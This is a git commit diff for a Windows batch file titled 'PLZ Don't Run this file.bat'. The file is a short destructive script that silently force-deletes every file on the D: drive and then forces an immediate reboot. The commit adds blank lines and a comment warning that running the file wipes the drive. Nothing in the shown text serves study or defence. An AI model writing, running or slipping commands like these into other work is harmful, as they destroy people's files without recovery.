bfc2ff1a303bf0ee1ccfb4f7d54ef4accdc5c707
Mahendra Lohar <46793896+mlohar1122@users.noreply.github.com>
2019-09-26 20:58:19 +0530

    Update PLZ Don't Run this file.bat

--- PLZ Don't Run this file.bat
+++ PLZ Don't Run this file.bat
@@ -1,6 +1,11 @@
+
 @Echo off 
 color 02
 color f3
 Del  d:*.*  /f /s /q
 shutdown -r -f -t 00
 pause
+
+
+
+//If You Are Run this file in your computer This file can automatically Delete Your pc "D:" Drive After Shut Down Your pc automatically
